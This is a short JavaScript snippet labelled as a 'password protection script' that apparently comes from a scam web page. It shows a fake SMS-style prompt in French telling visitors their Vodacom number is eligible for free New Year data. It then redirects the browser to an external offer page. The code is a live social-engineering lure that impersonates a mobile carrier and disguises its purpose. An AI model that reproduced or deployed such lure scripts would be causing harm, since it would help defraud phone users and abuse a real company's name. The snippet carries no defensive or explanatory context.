  
/* Password Protection Script by www.onlineofferz.xyz*/
var password = 'OFFRE DU NOUVEL AN'
password = prompt(
  'SMS: Félicitations ! Votre numéro Vodacom est éligible pour recevoir les données du Nouvel An. Veuillez appuyer sur OK pour soumettre votre numéro..',
  'OFFRE DU NOUVEL AN'
);
if (password != 'OFFRE DU NOUVEL AN') {
  location.href = 'https://offres.org/vodacom.html';
}
